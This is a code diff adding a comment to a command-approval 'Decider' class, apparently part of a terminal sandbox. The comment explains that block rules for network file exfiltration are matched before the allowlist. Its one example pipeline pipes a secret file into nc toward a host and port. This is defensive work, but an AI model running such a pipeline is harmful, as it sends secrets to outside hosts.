@@ -118,6 +118,15 @@ class Decider:
         # chains). Same-ID user overrides apply here too: only rules whose
         # action is block take part — an allow/modify replacement must not
         # block the full command before segment evaluation.
+        #
+        # DF-TERMINAL-JAIL-16: this whole-command pass is also what keeps the
+        # always-allow layer from APPROVING a pipeline whose sink is a raw
+        # network client. The file-exfiltration rules
+        # (builtin-net-file-exfil-pipe / -redirect) are BLOCK rules, so they are
+        # matched HERE — before the Layer-2 allowlist can short-circuit on the
+        # pipeline's reader segment and return `rule_id=allow-cat-safe` for
+        # `cat <secret> | nc <host> <port>`. Segment-level allow rules are
+        # unaffected for every shape these rules do not match.
         full_segment = Segment(
             type=SegmentType.SIMPLE,
             tokens=[],
